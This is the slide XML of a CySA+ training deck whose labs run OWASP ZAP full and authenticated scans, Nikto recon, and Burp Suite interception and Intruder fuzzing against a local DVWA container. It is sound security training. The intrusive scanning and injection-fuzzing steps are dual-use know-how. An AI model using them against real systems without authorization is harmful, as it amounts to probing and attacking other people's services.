            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ zap-full-scan.py -t http://127.0.0.1:8080 -r /tmp/zap_full.html || true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Map ZAP alerts to OWASP Top 10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Major ZAP alert classes:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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597</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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13 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Authenticated scan (deep coverage)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>ZAP can log in for you and crawl behind auth.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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064508"/>
            <a:ext cx="91440" cy="21534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05840" y="4912614"/>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05840" y="4912614"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Save evidence and tear down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Always hash report files; they become evidence for the remediation team and auditors.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum /tmp/zap_full.html</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598</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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13 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Run a passive and an active OWASP ZAP scan against DVWA.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Read ZAP HTML reports and map findings to OWASP Top 10.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The difference between baseline (safe) and full (intrusive) scans.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How authenticated scans surface deeper findings.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599</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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14 — Web Recon with Nikto and Burp Suite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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will perform web-server reconnaissance with Nikto and intercept/replay requests with Burp Suite Community. Together they cover CySA+ 2.2 (Web application scanners — Burp Suite, Nikto) and reinforce 2.4 (Recommended controls).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda + Local (Burp Suite Community)</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600</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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14 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install Nikto and start a target</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y nikto docker.io</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Run a Nikto scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Typical Nikto findings on DVWA:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nikto -h http://127.0.0.1:8080 -o /tmp/nikto.txt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Tune Nikto with plugins and tuning options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-Tuning numbers from the man page:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nikto -h http://127.0.0.1:8080 -Tuning 4 -Plugins "headers"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Install Burp Suite Community on your own laptop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Download: https://portswigger.net/burp/communitydownload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Configure your browser to use Burp's proxy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 3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39" name="TextBox 3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0" name="TextBox 3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601</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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14 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Intercept and modify a request (the killer Burp workflow)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This intercept/modify/replay loop is how analysts manually verify XSS, SQLi, IDOR, and CSRF findings flagged by automated scanners.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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923794"/>
            <a:ext cx="91440" cy="101269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05840" y="3201543"/>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05840" y="3201543"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Send to Intruder for fuzzing (Community is rate-limited but functional)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Differences in response length are the classic signal of a successful injection.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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64508"/>
            <a:ext cx="91440" cy="101269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05840" y="434225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05840" y="4342257"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Combine Nikto + Burp into a single workflow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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205222"/>
            <a:ext cx="91440" cy="101269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05840" y="5482971"/>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05840" y="5482971"/>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26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Tear down</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5437251"/>
            <a:ext cx="3977639" cy="5486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452360" y="5437251"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ docker stop dvwa &amp;&amp; docker rm dvwa</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="TextBox 2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30" name="TextBox 2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1" name="TextBox 3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602</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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14 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
